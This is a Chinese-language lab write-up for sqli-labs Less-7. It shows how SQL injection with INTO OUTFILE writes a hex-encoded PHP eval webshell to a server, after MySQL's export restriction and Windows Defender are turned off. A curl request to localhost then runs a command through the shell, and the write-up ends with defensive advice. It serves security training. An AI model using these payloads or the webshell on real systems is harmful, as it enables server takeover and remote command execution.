## 题目: Sqli-labs Less-7

## 题目描述
页面提示输入 ID 参数进行查询。本关不显示查询结果，且提示 `You have an error in your SQL syntax`。观察题目名字为 `Dump into outfile - String`，核心思路不再是读取数据，而是利用 MySQL 的 `INTO OUTFILE` 语句，将恶意 PHP 代码导出到服务器物理目录，从而获取 WebShell。

## 解题思路
根据关卡名字 `Dump into outfile`，我们需要使用 `UNION SELECT` 配合 `INTO OUTFILE` 将一句话木马写入到服务器中。前提是必须知道网站的真实物理路径，并且 MySQL 开启了文件导出权限。

## 解题步骤
**1. 测试闭合方式（⚠️ 踩坑记录）**
* **实战操作**：直接输入 `?id=1'`，页面报错。输入 `?id=1')) --+`，页面提示 `You are in.... Use outfile......`。
* **踩坑**：这关的闭合方式变成了 `'))`，即双引号加两层括号。如果少写或多写，都会报错。
* **破局**：确认闭合符为 `'))`。

**2. 突破 MySQL 导出限制（⚠️ 踩坑记录）**
* **实战操作**：直接尝试写入，页面报错无法写入文件。
* **踩坑**：MySQL 5.7 默认通过 `secure_file_priv` 限制文件导出。
* **破局**：在 PHPStudy 的 `my.ini` 的 `[mysqld]` 节点下添加 `secure_file_priv=""`，并**重启 MySQL 服务**。

**3. 解决杀毒拦截问题（⚠️ 踩坑记录）**
* **实战操作**：成功注入后，去本地文件夹查看，发现文件没有生成。
* **踩坑**：Windows Defender 实时监控会秒删生成的 WebShell。
* **破局**：在 Windows 安全中心关闭“实时保护”或将靶场目录加入排除项。

**4. 构造写入 Payload（原理解释）**
* **原理解释**：将 `<?php @eval($_POST['cmd']); ?>` 转为十六进制 `0x3c3f70687020406576616c28245f504f53545b27636d64275d293b203f3e`，避免引号破坏 SQL 语法。然后利用 `UNION SELECT 1,2,十六进制代码 INTO OUTFILE '物理路径'` 进行写入。Windows 路径必须用正斜杠 `/`。
* **实战 Payload**：
```
sql
?id=-1')) UNION SELECT 1,2,0x3c3f70687020406576616c28245f504f53545b27636d64275d293b203f3e INTO OUTFILE 'E:/phpStudy_64/phpstudy_pro/WWW/sqli-labs/Less-7/shell.php' --+
```
结果：执行后页面提示 You have an error in your SQL syntax（假报错）。去本地文件夹检查，shell.php 成功生成。

**5. 连马验证**
操作：在 CMD 中使用 curl 发送 POST 请求执行命令。

实战 Payload：
```cmd
curl -X POST "http://127.0.0.1/sqli-labs/Less-7/shell.php" -d "cmd=system('whoami');"
结果：成功回显 laptop-3r0vf5g1\25047，WebShell 写入成功。
```

## 知识点总结
*INTO OUTFILE 导出：在知道网站绝对路径且有写入权限时，可以通过 SQL 注入直接往服务器写 WebShell，从单纯的“数据泄露”升级为“获取服务器权限”。
*十六进制编码：PHP 代码中含有单引号等特殊字符，在 SQL 注入时会破坏语法结构，转为 Hex 编码可以完美绕过。
*假报错现象：部分环境在成功写入文件后，页面依然会报 SQL 语法错误，这时必须以本地物理文件夹里是否生成文件为准。
*防御策略：设置 secure_file_priv 为固定路径或 NULL；遵循最小权限原则，禁止数据库账号拥有写文件权限；使用 PDO 预编译。
